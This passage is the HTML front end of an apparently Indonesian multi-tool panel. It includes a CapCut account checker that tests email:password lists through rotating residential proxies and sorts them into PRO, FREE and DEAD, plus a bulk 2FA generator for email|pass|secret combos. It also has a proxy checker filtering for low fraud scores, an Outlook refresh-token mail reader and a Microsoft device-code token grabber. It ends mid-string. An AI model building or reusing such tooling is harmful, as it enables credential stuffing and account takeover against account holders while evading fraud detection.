                <small class="text-muted d-block mb-2" style="font-size: 0.75rem;" data-i18n="cc_proxy_help">Gunakan token <code>{sess}</code> untuk rotasi IP otomatis.</small>

                <div class="d-flex align-items-center justify-content-between p-2 rounded bg-black border border-secondary">
                  <div class="d-flex align-items-center gap-1.5">
                    <i class="fa-solid fa-chart-pie text-info small"></i>
                    <span class="small text-secondary fw-semibold" style="font-size: 0.75rem;">KUOTA PROXY:</span>
                  </div>
                  <div class="d-flex align-items-center gap-2">
                    <span id="ccProxyUsageBadge" class="badge bg-dark border border-info text-info font-monospace" style="font-size: 0.78rem;">0 B</span>
                    <button class="btn btn-sm btn-link text-secondary p-0 text-decoration-none" onclick="resetCapcutProxyUsage()" title="Reset Pemakaian">
                      <i class="fa-solid fa-rotate-left fa-xs text-warning"></i>
                    </button>
                  </div>
                </div>
              </div>

              <div class="row g-2 mb-3">
                <div class="col-6">
                  <label class="form-label text-secondary small fw-semibold" data-i18n="cc_threads_label">THREADS</label>
                  <input type="number" id="ccWorkersInput" class="form-control form-control-theme" value="6" min="1" max="25">
                </div>
                <div class="col-6">
                  <label class="form-label text-secondary small fw-semibold" data-i18n="cc_retries_label">IP RETRIES</label>
                  <input type="number" id="ccRetriesInput" class="form-control form-control-theme" value="6" min="1" max="15">
                </div>
              </div>

              <div class="d-flex gap-2">
                <button id="btnStartCapcut" class="btn btn-gold flex-grow-1 py-2" onclick="startCapcutChecking()">
                  <i class="fa-solid fa-play me-2"></i><span data-i18n="cc_btn_start">Mulai Check CapCut</span>
                </button>
                <button id="btnStopCapcut" class="btn btn-outline-secondary py-2" onclick="stopCapcutChecking()" disabled>
                  <i class="fa-solid fa-stop me-2"></i><span data-i18n="cc_btn_stop">Stop</span>
                </button>
              </div>

              <!-- Animated Live Progress Bar -->
              <div class="cc-progress-container" id="ccProgressBox" style="display: none; margin-top: 12px; background: #110a06; border: 1px solid var(--border-bronze); border-radius: 10px; padding: 12px;">
                <div class="d-flex justify-content-between align-items-center mb-1 small">
                  <span class="text-warning fw-semibold"><i class="fa-solid fa-spinner fa-spin me-1"></i>Checking...</span>
                  <span id="ccProgressText" class="font-monospace text-light">0/0 (0%)</span>
                </div>
                <div class="progress bg-dark" style="height: 8px; border: 1px solid var(--border-bronze); border-radius: 6px; overflow: hidden;">
                  <div class="cc-progress-bar" id="ccProgressBar" style="width: 0%; height: 8px; border-radius: 6px; background: linear-gradient(90deg, #d97706, #f59e0b); box-shadow: 0 0 10px rgba(245, 158, 11, 0.35); transition: width 0.2s ease;"></div>
                </div>
              </div>
            </div>
          </div>

          <div class="col-lg-7">
            <div class="card card-theme p-4 shadow-sm">
              <div class="d-flex justify-content-between align-items-center mb-3">
                <h5 class="fw-bold mb-0 text-warning"><i class="fa-solid fa-square-poll-vertical me-2"></i><span data-i18n="cc_results_title">Hasil Pengecekan CapCut</span></h5>
                <div class="d-flex gap-2">
                  <button class="btn btn-sm btn-outline-gold" onclick="downloadCapcutAll('csv')">
                    <i class="fa-solid fa-file-csv me-1"></i>CSV
                  </button>
                  <button class="btn btn-sm btn-outline-gold" onclick="downloadCapcutAll('txt')">
                    <i class="fa-solid fa-file-lines me-1"></i>TXT
                  </button>
                </div>
              </div>

              <div class="mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <span class="fw-bold text-success">
                    <i class="fa-solid fa-crown me-1"></i><span data-i18n="cc_pro_title">PRO / VIP</span> 
                    <span id="proCount" class="badge bg-success badge-counter ms-1">0</span>
                  </span>
                  <div class="btn-group btn-group-sm">
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyField('proResult')" data-i18n="cc_btn_copy">Copy</button>
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadField('proResult', 'capcut_pro.txt')" data-i18n="cc_btn_save">Save</button>
                  </div>
                </div>
                <textarea id="proResult" class="form-control form-control-theme border-success" rows="4" readonly data-i18n-ph="cc_pro_ph" placeholder="Akun PRO akan muncul di sini..."></textarea>
              </div>

              <div class="mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <span class="fw-bold text-info">
                    <i class="fa-solid fa-user me-1"></i><span data-i18n="cc_free_title">FREE / REGULAR</span>
                    <span id="freeCount" class="badge bg-info text-dark badge-counter ms-1">0</span>
                  </span>
                  <div class="btn-group btn-group-sm">
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyField('freeResult')" data-i18n="cc_btn_copy">Copy</button>
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadField('freeResult', 'capcut_free.txt')" data-i18n="cc_btn_save">Save</button>
                  </div>
                </div>
                <textarea id="freeResult" class="form-control form-control-theme border-info" rows="4" readonly data-i18n-ph="cc_free_ph" placeholder="Akun FREE akan muncul di sini..."></textarea>
              </div>

              <div>
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <span class="fw-bold text-danger">
                    <i class="fa-solid fa-circle-xmark me-1"></i><span data-i18n="cc_dead_title">DEAD / ERROR</span>
                    <span id="dieCount" class="badge bg-danger badge-counter ms-1">0</span>
                  </span>
                  <div class="btn-group btn-group-sm">
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyField('dieResult')" data-i18n="cc_btn_copy">Copy</button>
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadField('dieResult', 'capcut_die.txt')" data-i18n="cc_btn_save">Save</button>
                  </div>
                </div>
                <textarea id="dieResult" class="form-control form-control-theme border-danger" rows="3" readonly data-i18n-ph="cc_dead_ph" placeholder="Akun Gagal akan muncul di sini..."></textarea>
              </div>

            </div>
          </div>

        </div>
      </div>
    </div>

    <!-- TAB 3: 2FA GENERATOR -->
    <div id="tab-2fa" class="tab-pane-custom">
      <div class="capcut-container">
        <div class="row g-4 justify-content-center">
          
          <!-- Single 2FA Generator -->
          <div class="col-lg-5 col-md-12">
            <div class="card card-theme p-4 shadow-sm h-100">
              <div class="d-flex align-items-center gap-2 mb-3">
                <i class="fa-solid fa-shield-halved text-warning fs-5"></i>
                <h5 class="fw-bold mb-0 text-warning" data-i18n="tfa_single_title">Quick 2FA Code (Single)</h5>
              </div>
              <p class="text-secondary small mb-3" data-i18n="tfa_single_desc">
                Masukkan 2FA Secret Key (Base32) untuk mendapatkan kode verifikasi 6 digit instan.
              </p>

              <div class="mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <label class="form-label small text-secondary fw-semibold mb-0" data-i18n="tfa_single_label">2FA SECRET KEY</label>
                  <button class="btn btn-sm btn-link text-secondary p-0 text-decoration-none small" onclick="document.getElementById('single2faSecret').value=''; resetSingle2fa();">
                    <i class="fa-solid fa-trash-can fa-xs me-1"></i>Clear
                  </button>
                </div>
                <div class="input-group">
                  <input type="text" id="single2faSecret" class="form-control form-control-theme" data-i18n-ph="tfa_single_ph" placeholder="Contoh: JBSWY3DPEHPK3PXP" autocomplete="off" spellcheck="false" oninput="if(!this.value.trim()) resetSingle2fa();" onkeydown="if(event.key==='Enter') generateSingle2fa()">
                  <button class="btn btn-gold px-3" type="button" onclick="generateSingle2fa()">
                    <i class="fa-solid fa-bolt me-1"></i> <span data-i18n="tfa_btn_get">Get Code</span>
                  </button>
                </div>
              </div>

              <!-- Single Result Card -->
              <div id="single2faResultBox" class="p-3 rounded border border-secondary text-center my-auto" style="background: #120b06;">
                <div class="text-secondary small mb-1" data-i18n="tfa_auth_code_label">AUTHENTICATOR CODE</div>
                <div id="single2faCodeDisplay" class="display-5 fw-bold text-warning font-monospace letter-spacing-2 py-2" style="letter-spacing: 4px;">
                  ------
                </div>
                <div class="d-flex align-items-center justify-content-center gap-2 mt-2">
                  <div class="progress flex-grow-1" style="height: 6px; background-color: #2b1d13; max-width: 140px;">
                    <div id="single2faTimerBar" class="progress-bar bg-warning" role="progressbar" style="width: 0%;"></div>
                  </div>
                  <span id="single2faTimerText" class="badge bg-dark border border-secondary text-light font-monospace small">--s</span>
                </div>
                <div class="mt-3">
                  <button id="btnCopySingle2fa" class="btn btn-sm btn-outline-gold px-3" onclick="copySingle2fa()" disabled>
                    <i class="fa-regular fa-copy me-1"></i> <span data-i18n="tfa_btn_copy_code">Salin Kode</span>
                  </button>
                </div>
              </div>

            </div>
          </div>

          <!-- Bulk 2FA Generator -->
          <div class="col-lg-7 col-md-12">
            <div class="card card-theme p-4 shadow-sm h-100">
              <div class="d-flex justify-content-between align-items-center mb-3">
                <div class="d-flex align-items-center gap-2">
                  <i class="fa-solid fa-list-check text-warning fs-5"></i>
                  <h5 class="fw-bold mb-0 text-warning" data-i18n="tfa_bulk_title">Bulk 2FA Generator</h5>
                </div>
              </div>
              <p class="text-secondary small mb-3" data-i18n="tfa_bulk_desc">
                Mendukung paste banyak Secret Key atau baris combo (format <code>email|pass|secret</code> atau secret per baris).
              </p>

              <div class="mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <label class="form-label small text-secondary fw-semibold mb-0" data-i18n="tfa_bulk_label">INPUT LIST SECRETS / COMBOS</label>
                  <button class="btn btn-sm btn-link text-secondary p-0 text-decoration-none small" onclick="clearBulk2fa()">
                    <i class="fa-solid fa-trash-can fa-xs me-1"></i>Clear
                  </button>
                </div>
                <textarea id="bulk2faInput" class="form-control form-control-theme" rows="6" data-i18n-ph="tfa_bulk_ph" placeholder="Contoh format:&#10;user1@email.com|pass1|JBSWY3DPEHPK3PXP&#10;user2@email.com:pass2:4X72J6...&#10;HXDMVJZTGNCDESRR..." oninput="if(!this.value.trim()) clearBulk2fa()"></textarea>
              </div>

              <div class="d-flex gap-2 mb-3">
                <button id="btnRunBulk2fa" class="btn btn-gold flex-grow-1 py-2" onclick="generateBulk2fa()">
                  <i class="fa-solid fa-arrows-rotate me-1"></i> <span data-i18n="tfa_btn_gen_all">Generate All Codes</span>
                </button>
                <button class="btn btn-outline-gold px-3" onclick="copyField('bulk2faOutput')" title="Copy Output">
                  <i class="fa-regular fa-copy me-1"></i> Copy
                </button>
                <button class="btn btn-outline-gold px-3" onclick="downloadField('bulk2faOutput', '2fa_codes.txt')" title="Save TXT">
                  <i class="fa-solid fa-download me-1"></i> Save
                </button>
              </div>

              <div class="mb-0">
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <label class="form-label small text-secondary fw-semibold mb-0" data-i18n="tfa_bulk_res_label">HASIL (FORMAT COMBO + 2FA CODE)</label>
                  <span id="bulk2faCount" class="badge bg-dark border border-secondary text-warning small">0 generated</span>
                </div>
                <textarea id="bulk2faOutput" class="form-control form-control-theme border-warning" rows="6" readonly data-i18n-ph="tfa_bulk_res_ph" placeholder="Hasil kode 2FA akan muncul di sini..."></textarea>
              </div>

            </div>
          </div>

        </div>
      </div>
    </div>

    <!-- TAB 4: PROXY CHECKER -->
    <div id="tab-proxy" class="tab-pane-custom">
      <div class="capcut-container">
        <div class="row g-3">
          
          <!-- Left Column: Input & Settings -->
          <div class="col-lg-4 col-md-12">
            <div class="card card-theme p-3 shadow-sm h-100 d-flex flex-column">
              <div class="d-flex justify-content-between align-items-center mb-2">
                <div class="d-flex align-items-center gap-2">
                  <i class="fa-solid fa-server text-warning fs-5"></i>
                  <h5 class="fw-bold mb-0 text-warning" data-i18n="prx_title">Proxy Checker</h5>
                </div>
                <span class="badge bg-dark border border-warning text-warning px-2 py-1 small">HTTP / SOCKS</span>
              </div>
              <p class="text-secondary small mb-2" data-i18n="prx_desc">
                Dukungan format: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, atau <code>scheme://...</code>
              </p>

              <!-- Proxy Textarea Input -->
              <div class="mb-2 flex-grow-1 d-flex flex-column">
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <label class="form-label small text-secondary fw-semibold mb-0" data-i18n="prx_input_label">INPUT PROXY LIST</label>
                  <div class="d-flex gap-2">
                    <button class="btn btn-sm btn-link text-warning p-0 text-decoration-none small" onclick="loadSampleProxies()">
                      <i class="fa-solid fa-lightbulb fa-xs me-1"></i><span data-i18n="prx_btn_sample">Sample</span>
                    </button>
                    <button class="btn btn-sm btn-link text-secondary p-0 text-decoration-none small" onclick="clearProxyInput()">
                      <i class="fa-solid fa-trash-can fa-xs me-1"></i><span data-i18n="prx_btn_clear">Clear</span>
                    </button>
                  </div>
                </div>
                <textarea id="proxyInput" class="form-control form-control-theme flex-grow-1" style="min-height: 140px;" data-i18n-ph="prx_input_ph" placeholder="Contoh format:&#10;192.168.1.1:8080&#10;192.168.1.1:8080:username:password&#10;username:password:192.168.1.1:8080&#10;http://user:pass@192.168.1.1:8080"></textarea>
              </div>

              <!-- Options / Settings -->
              <div class="card p-2 mb-3 bg-dark border-secondary">
                <div class="row g-2">
                  <div class="col-6">
                    <label class="form-label small text-secondary mb-1" data-i18n="prx_threads_label">THREADS</label>
                    <input type="number" id="proxyConcurrency" class="form-control form-control-sm form-control-theme" value="5" min="1" max="20">
                  </div>
                  <div class="col-6">
                    <label class="form-label small text-secondary mb-1" data-i18n="prx_timeout_label">TIMEOUT (s)</label>
                    <input type="number" id="proxyTimeout" class="form-control form-control-sm form-control-theme" value="15" min="2" max="60">
                  </div>
                  <div class="col-12">
                    <div class="form-check form-switch mt-1">
                      <input class="form-check-input" type="checkbox" id="checkScamalyticsToggle">
                      <label class="form-check-label small text-light" for="checkScamalyticsToggle">
                        <span data-i18n="prx_scamalytics_toggle">Scamalytics Fraud Score Check</span> <span class="badge bg-secondary text-warning" style="font-size: 0.65rem;">Deep</span>
                      </label>
                    </div>
                  </div>
                </div>
              </div>

              <!-- Action Buttons -->
              <div class="d-flex gap-2">
                <button id="btnStartProxy" class="btn btn-gold flex-grow-1 py-2 fw-semibold" onclick="startProxyChecking()">
                  <i class="fa-solid fa-play me-1"></i> <span data-i18n="prx_btn_start">Start Checking</span>
                </button>
                <button id="btnStopProxy" class="btn btn-outline-danger px-3 py-2" onclick="stopProxyChecking()" disabled>
                  <i class="fa-solid fa-stop me-1"></i> <span data-i18n="prx_btn_stop">Stop</span>
                </button>
              </div>
            </div>
          </div>

          <!-- Right Column: Stats, Filter, Results Table & Export -->
          <div class="col-lg-8 col-md-12">
            <div class="card card-theme p-3 shadow-sm h-100 d-flex flex-column">
              <!-- Stats Summary Bar -->
              <div class="row g-2 mb-3">
                <div class="col-sm-2 col-4">
                  <div class="p-2 text-center rounded bg-dark border border-secondary">
                    <div class="text-secondary small fw-semibold" style="font-size: 0.7rem;" data-i18n="prx_stat_total">TOTAL</div>
                    <div id="proxyStatTotal" class="fs-5 fw-bold text-light">0</div>
                  </div>
                </div>
                <div class="col-sm-2 col-4">
                  <div class="p-2 text-center rounded bg-dark border border-success">
                    <div class="text-success small fw-semibold" style="font-size: 0.7rem;" data-i18n="prx_stat_live">LIVE</div>
                    <div id="proxyStatLive" class="fs-5 fw-bold text-success">0</div>
                  </div>
                </div>
                <div class="col-sm-2 col-4">
                  <div class="p-2 text-center rounded bg-dark border border-danger">
                    <div class="text-danger small fw-semibold" style="font-size: 0.7rem;" data-i18n="prx_stat_dead">DEAD</div>
                    <div id="proxyStatDead" class="fs-5 fw-bold text-danger">0</div>
                  </div>
                </div>
                <div class="col-sm-3 col-6">
                  <div class="p-2 text-center rounded bg-dark border border-warning">
                    <div class="text-warning small fw-semibold" style="font-size: 0.7rem;" data-i18n="prx_stat_latency">AVG LATENCY</div>
                    <div id="proxyStatLatency" class="fs-5 fw-bold text-warning">-</div>
                  </div>
                </div>
                <div class="col-sm-3 col-6">
                  <div class="p-2 text-center rounded bg-dark border border-info">
                    <div class="text-info small fw-semibold" style="font-size: 0.7rem;" data-i18n="prx_stat_clean">LOW FRAUD (&lt;25)</div>
                    <div id="proxyStatLowFraud" class="fs-5 fw-bold text-info">0</div>
                  </div>
                </div>
              </div>

              <!-- Progress Bar -->
              <div class="progress mb-3" style="height: 6px; background-color: #24160d;">
                <div id="proxyProgressBar" class="progress-bar bg-warning" role="progressbar" style="width: 0%;"></div>
              </div>

              <!-- Filter & Search Toolbar -->
              <div class="d-flex flex-wrap justify-content-between align-items-center gap-2 mb-2">
                <div class="btn-group btn-group-sm" role="group">
                  <button type="button" class="btn btn-outline-warning active" id="filterProxyAll" onclick="setProxyFilter('all')"><span data-i18n="prx_filter_all">All</span> (<span id="countFilterAll">0</span>)</button>
                  <button type="button" class="btn btn-outline-success" id="filterProxyLive" onclick="setProxyFilter('live')"><span data-i18n="prx_filter_live">Live</span> (<span id="countFilterLive">0</span>)</button>
                  <button type="button" class="btn btn-outline-danger" id="filterProxyDead" onclick="setProxyFilter('dead')"><span data-i18n="prx_filter_dead">Dead</span> (<span id="countFilterDead">0</span>)</button>
                  <button type="button" class="btn btn-outline-info" id="filterProxyClean" onclick="setProxyFilter('clean')"><span data-i18n="prx_filter_clean">Low Fraud</span> (<span id="countFilterClean">0</span>)</button>
                </div>

                <div class="d-flex gap-2 align-items-center">
                  <div class="input-group input-group-sm" style="max-width: 170px;">
                    <span class="input-group-text bg-dark border-secondary text-secondary"><i class="fa-solid fa-magnifying-glass"></i></span>
                    <input type="text" id="proxySearchInput" class="form-control form-control-sm form-control-theme" data-i18n-ph="prx_search_ph" placeholder="Cari IP / Negara..." oninput="renderProxyTable()">
                  </div>

                  <!-- Export Dropdown -->
                  <div class="dropdown">
                    <button class="btn btn-sm btn-gold dropdown-toggle" type="button" data-bs-toggle="dropdown">
                      <i class="fa-solid fa-download me-1"></i> <span data-i18n="prx_btn_export">Export</span>
                    </button>
                    <ul class="dropdown-menu dropdown-menu-dark dropdown-menu-end border-warning shadow">
                      <li><a class="dropdown-item" href="javascript:void(0)" onclick="copyLiveProxies('raw')" data-i18n="prx_exp_live_raw"><i class="fa-regular fa-copy me-2 text-warning"></i>Copy Live (Original Format)</a></li>
                      <li><a class="dropdown-item" href="javascript:void(0)" onclick="copyLiveProxies('ipport')" data-i18n="prx_exp_live_ipport"><i class="fa-solid fa-network-wired me-2 text-warning"></i>Copy Live (HOST:PORT)</a></li>
                      <li><hr class="dropdown-divider border-secondary"></li>
                      <li><a class="dropdown-item" href="javascript:void(0)" onclick="downloadLiveProxiesTxt()" data-i18n="prx_exp_live_txt"><i class="fa-regular fa-file-lines me-2 text-warning"></i>Download Live (.TXT)</a></li>
                      <li><a class="dropdown-item" href="javascript:void(0)" onclick="downloadProxyReportJson()" data-i18n="prx_exp_report_json"><i class="fa-solid fa-code me-2 text-warning"></i>Download Full Report (.JSON)</a></li>
                    </ul>
                  </div>
                </div>
              </div>

              <!-- Results Table -->
              <div class="table-responsive flex-grow-1" style="max-height: 440px; overflow-y: auto;">
                <table class="table table-dark table-hover align-middle mb-0" style="font-size: 0.82rem; border-color: #382415;">
                  <thead class="sticky-top" style="background-color: #1a0f07; z-index: 1;">
                    <tr class="text-secondary small">
                      <th style="width: 40px;">#</th>
                      <th data-i18n="prx_th_proxy">PROXY</th>
                      <th style="width: 80px;" data-i18n="prx_th_status">STATUS</th>
                      <th style="width: 85px;" data-i18n="prx_th_ping">PING</th>
                      <th data-i18n="prx_th_loc">EXIT IP &amp; LOCATION</th>
                      <th data-i18n="prx_th_isp">ISP / ORG</th>
                      <th data-i18n="prx_th_fraud">FRAUD RISK</th>
                      <th style="width: 50px;" data-i18n="prx_th_act">ACT</th>
                    </tr>
                  </thead>
                  <tbody id="proxyTableBody">
                    <tr>
                      <td colspan="8" class="text-center py-5 text-secondary" data-i18n="prx_empty_table">
                        <i class="fa-solid fa-server fa-2x mb-2 d-block opacity-50"></i>
                        Belum ada proxy yang diperiksa. Masukkan list proxy dan klik <b>Start Checking</b>.
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>

            </div>
          </div>
        </div>
      </div>
    </div>

  </div>

  <!-- Modal Proxy Details -->
  <div class="modal fade" id="proxyDetailModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content card-theme border-warning text-light">
        <div class="modal-header border-secondary">
          <h5 class="modal-title fw-bold text-warning"><i class="fa-solid fa-circle-info me-2"></i><span data-i18n="prx_modal_title">Proxy Diagnostic Details</span></h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
        </div>
        <div class="modal-body" id="proxyDetailModalBody">
          <!-- Dynamic details content -->
        </div>
        <div class="modal-footer border-secondary">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal" data-i18n="prx_modal_close">Tutup</button>
        </div>
      </div>
    </div>
  </div>

  <!-- Modal Add Account -->
  <div class="modal fade" id="addAccountModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content card-theme border-warning text-light">
        <div class="modal-header border-secondary">
          <h5 class="modal-title fw-bold text-warning"><i class="fa-solid fa-user-plus me-2"></i><span data-i18n="tm_modal_add_title">Add Outlook / Hotmail Accounts</span></h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
        </div>
        <div class="modal-body">
          <div class="mb-3">
            <label class="form-label small text-secondary fw-semibold" data-i18n="tm_modal_upload_label">UPLOAD FILE .TXT (Bulk Import)</label>
            <input type="file" id="modalFileInput" class="form-control form-control-sm form-control-theme" accept=".txt,.csv" onchange="handleModalFileSelect(event)">
          </div>
          <label class="form-label small text-secondary fw-semibold" data-i18n="tm_modal_paste_label">ATAU PASTE TOKENS (email|pass|refresh_token|client_id atau token saja)</label>
          <textarea id="modalAccountInput" class="form-control form-control-theme" rows="6" placeholder="user@hotmail.com|password|M.R3_BAY...|9e5f94bc-e8a4-4e73-b8be-63364c29d753"></textarea>
          
          <div class="mt-3">
            <label class="form-label small text-secondary fw-semibold" data-i18n="tm_modal_proxy_label">PROXY (Opsional: http://user:pass@host:port)</label>
            <input type="text" id="modalProxyInput" class="form-control form-control-theme" data-i18n-ph="tm_modal_proxy_ph" placeholder="Kosongkan jika direct">
          </div>
        </div>
        <div class="modal-footer border-secondary">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal" data-i18n="tm_modal_btn_cancel">Batal</button>
          <button type="button" class="btn btn-gold" onclick="submitNewOutlookAccounts()">
            <i class="fa-solid fa-check me-1"></i> <span data-i18n="tm_modal_btn_import">Import & Check</span>
          </button>
        </div>
      </div>
    </div>
  </div>

  <!-- Modal Microsoft OAuth Device Generator -->
  <div class="modal fade" id="deviceAuthModal" tabindex="-1" aria-hidden="true" data-bs-backdrop="static">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content card-theme border-warning text-light shadow-lg">
        <div class="modal-header border-secondary">
          <h5 class="modal-title fw-bold text-warning">
            <i class="fa-brands fa-microsoft me-2"></i>Generator Token Resmi Microsoft
          </h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" onclick="stopDeviceAuthPolling()"></button>
        </div>
        <div class="modal-body text-center p-4">
          
          <div id="deviceAuthStepLoading">
            <div class="spinner-border text-warning mb-3" role="status"></div>
            <p class="text-secondary small mb-0">Menghubungi server Microsoft untuk meminta kode otorisasi...</p>
          </div>

          <div id="deviceAuthStepCode" style="display: none;">
            <p class="small text-secondary mb-2">1. Salin kode otorisasi berikut:</p>
            <div class="d-flex justify-content-center align-items-center gap-2 mb-3">
              <span id="deviceAuthUserCode" class="fs-2 fw-bold font-monospace text-warning px-3 py-1 rounded bg-black border border-warning" style="letter-spacing: 2px;">--------</span>
              <button class="btn btn-outline-warning btn-sm py-2 px-3" onclick="copyDeviceUserCode()" title="Salin Kode">
                <i class="fa-regular fa-copy me-1"></i>Copy
              </button>
            </div>
            
            <p class="small text-secondary mb-3">2. Klik tombol di bawah untuk membuka halaman login resmi Microsoft, tempelkan kode tersebut lalu login akun Anda:</p>
            
            <a id="deviceAuthLoginLink" href="https://microsoft.com/devicelogin" target="_blank" class="btn btn-gold w-100 py-2 mb-3 fw-bold">
              <i class="fa-solid fa-arrow-up-right-from-square me-2"></i>Buka Login Microsoft (microsoft.com/devicelogin)
            </a>

            <div class="p-2 rounded bg-black border border-secondary text-secondary small d-flex align-items-center justify-content-center gap-2">
              <div class="spinner-grow spinner-grow-sm text-warning" role="status"></div>
              <span id="deviceAuthStatusText">Menunggu persetujuan login di browser Microsoft...</span>
            </div>
          </div>

          <div id="deviceAuthStepSuccess" style="display: none;">
            <i class="fa-solid fa-circle-check text-success fa-3x mb-2"></i>
            <h5 class="fw-bold text-success">Token Resmi Berhasil Didapatkan!</h5>
            <p id="deviceAuthSuccessEmail" class="text-warning small fw-semibold mb-2"></p>
            <textarea id="deviceAuthResultLine" class="form-control form-control-theme font-monospace small mb-3" rows="3" readonly></textarea>
            <div class="d-flex gap-2">
              <button class="btn btn-outline-warning flex-grow-1" onclick="copyDeviceResultLine()">
                <i class="fa-regular fa-copy me-1"></i>Copy Format Mail Reader
              </button>
              <button class="btn btn-gold flex-grow-1" onclick="applyDeviceTokenToMailReader()">
                <i class="fa-solid fa-inbox me-1"></i>Buka di Mail Reader
              </button>
            </div>
          </div>

        </div>
        <div class="modal-footer border-secondary">
          <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal" onclick="stopDeviceAuthPolling()">Tutup</button>
        </div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    /* ================= INTERNATIONALIZATION (i18n) ================= */
    const I18N_DICTS = {"id": {"brand_sub": "MULTI TOOLS • LAYANAN SOSMED", "tab_mail": "Mail Reader", "tab_capcut": "CapCut Checker", "tab_2fa": "2FA Generator", "tab_proxy": "Proxy Checker", "tm_accounts_title": "Accounts", "tm_clear_all_title": "Hapus Semua Akun", "tm_search_acc_ph": "Cari email akun...", "tm_upload_txt": "Upload .TXT", "tm_upload_txt_title": "Upload File .TXT (Bulk Auto-read)", "tm_add_btn": "Add", "tm_add_btn_title": "Tambah Akun Manual", "tm_mode_search": "Mode: Cari Email", "tm_mode_all": "Mode: Semua Akun", "tm_show_all": "Tampilkan Semua", "tm_search_only": "Mode Cari Saja", "tm_empty_acc_msg": "Belum ada akun.<br>Upload file <b>.TXT</b> atau klik <b>Add</b>.", "tm_inbox_title": "INBOX", "tm_btn_accounts": "Akun", "tm_filter_msg_ph": "Filter pengirim / subjek...", "tm_empty_inbox_select": "Pilih akun di sebelah kiri untuk melihat pesan inbox.", "tm_active_email_placeholder": "Pilih Akun", "tm_badge_standby": "● Standby", "tm_badge_connected": "● Connected", "tm_badge_disconnected": "● Disconnected", "tm_btn_copy": "Copy", "tm_no_email_selected": "Belum ada email yang dipilih", "tm_click_inbox_hint": "Klik salah satu email dari daftar inbox untuk membaca isi surat.", "tm_otp_detected": "KODE VERIFIKASI / OTP TERDETEKSI", "tm_btn_copy_otp": "Salin OTP", "tm_copied": "Disalin!", "tm_search_another_title": "Cari Akun Lain", "tm_search_another_desc": "Ketik email di kolom pencarian di atas untuk memilih akun.", "tm_accounts_avail": "Akun Tersedia", "tm_inbox_empty": "Inbox kosong.", "tm_no_msg_filter": "Tidak ada pesan yang cocok dengan filter.", "tm_no_acc_match": "Tidak ada akun yang cocok dengan", "tm_delete_acc_confirm": "Hapus {email} dari daftar?", "tm_clear_all_confirm": "Hapus semua daftar akun Mail Checker?", "tm_extracting": "Mengekstrak & memeriksa akun...", "tm_modal_add_title": "Add Outlook / Hotmail Accounts", "tm_modal_upload_label": "UPLOAD FILE .TXT (Bulk Import)", "tm_modal_paste_label": "ATAU PASTE TOKENS (email|pass|refresh_token|client_id atau token saja)", "tm_modal_proxy_label": "PROXY (Opsional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Kosongkan jika direct", "tm_modal_btn_cancel": "Batal", "tm_modal_btn_import": "Import & Check", "cc_card_title": "Input Akun CapCut", "cc_acc_label": "DAFTAR AKUN (email:pass, email|pass, dll)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "RESIDENTIAL PROXY URL (Wajib)", "cc_proxy_help": "Gunakan token <code>{sess}</code> untuk rotasi IP otomatis.", "cc_threads_label": "THREADS", "cc_retries_label": "IP RETRIES", "cc_btn_start": "Mulai Check CapCut", "cc_btn_stop": "Stop", "cc_results_title": "Hasil Pengecekan CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Akun PRO akan muncul di sini...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "Akun FREE akan muncul di sini...", "cc_dead_title": "DEAD / ERROR", "cc_dead_ph": "Akun Gagal akan muncul di sini...", "cc_btn_copy": "Copy", "cc_btn_save": "Save", "cc_alert_empty": "Silakan masukkan daftar akun CapCut!", "cc_alert_no_valid": "Tidak ada akun valid yang ditemukan!", "tfa_single_title": "Quick 2FA Code (Single)", "tfa_single_desc": "Masukkan 2FA Secret Key (Base32) untuk mendapatkan kode verifikasi 6 digit instan.", "tfa_single_label": "2FA SECRET KEY", "tfa_single_ph": "Contoh: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Get Code", "tfa_auth_code_label": "AUTHENTICATOR CODE", "tfa_btn_copy_code": "Salin Kode", "tfa_bulk_title": "Bulk 2FA Generator", "tfa_bulk_desc": "Mendukung paste banyak Secret Key atau baris combo (format <code>email|pass|secret</code> atau secret per baris).", "tfa_bulk_label": "INPUT LIST SECRETS / COMBOS", "tfa_bulk_ph": "Contoh format:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...\\nHXDMVJZTGNCDESRR...", "tfa_btn_gen_all": "Generate All Codes", "tfa_bulk_res_label": "HASIL (FORMAT COMBO + 2FA CODE)", "tfa_bulk_res_ph": "Hasil kode 2FA akan muncul di sini...", "tfa_alert_empty_single": "Silakan masukkan 2FA Secret Key!", "tfa_alert_empty_bulk": "Silakan masukkan list secret / combo!", "tfa_processing": "Memproses...", "prx_title": "Proxy Checker", "prx_desc": "Dukungan format: 